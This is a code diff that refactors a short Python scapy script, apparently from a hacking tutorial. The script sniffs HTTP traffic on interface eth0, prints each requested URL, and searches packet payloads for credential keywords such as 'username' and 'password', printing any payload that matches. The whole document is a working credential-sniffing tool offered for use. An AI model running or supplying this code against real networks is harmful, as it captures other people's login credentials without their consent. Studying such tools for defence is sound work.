@@ -6,26 +6,33 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
+def get_url(packet):
+    return "{}{}".format(packet[http.HTTPRequest].Host, packet[http.HTTPRequest].Path)
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        # print(packet)
+        load = packet[scapy.Raw].load
+        keywords = [
+            'username', 'login', 'uname',
+            'user', 'password', 'pass',
+        ]
+
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         # print(packet.show())
-        url = "{}{}".format(packet[http.HTTPRequest].Host, packet[http.HTTPRequest].Path)
-        print(url)
+        url = get_url(packet)
+        print("[+] HTTP Request >>> {}".format(url))
+        login_info = get_login_info(packet)
+        if login_info: 
+            print("-"*60)
+            print(login_info)
+            print("-"*60)
 
-        if packet.haslayer(scapy.Raw):
-            # print(packet)
-            load = packet[scapy.Raw].load
-            keywords = [
-                'username', 'login', 'uname',
-                'user', 'password', 'pass',
-            ]
-
-            for keyword in keywords:
-                if keyword in load:
-                    print("-"*60)
-                    print(load)
-                    print("-"*60)
-                    break
 
 
 sniff("eth0")
